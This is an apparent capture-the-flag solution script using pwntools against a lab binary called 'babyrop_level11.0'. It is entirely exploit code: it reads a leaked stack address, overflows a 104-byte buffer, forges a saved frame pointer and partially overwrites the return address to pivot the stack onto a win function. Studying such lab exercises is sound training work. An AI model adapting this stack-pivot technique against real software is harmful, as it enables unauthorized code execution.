from pwn import *

p = process("./babyrop_level11.0", env={})

print(p.recvuntil(b"[LEAK] Your input buffer is located at: "))

input_addr_leak = p.recvline().split(b'.')[0] # leaked input buffer addr
win_func_ptr = int(input_addr_leak, 16) - 0x8 # given relation that win_func_ptr is 0x8 before input_addr

payload = b""
payload += b"A" * 104 # buffer
payload += p64(win_func_ptr - 0x8) # saved_rbp ( win_func_ptr - 0x8 cuz when at every "leave", rsp <- rbp + 0x8 )
payload += b"\x35" + b"\x86" # leave (rsp -> rbp + 0x8; pop rbp;)

p.send(payload)

print(p.clean())

p.close()
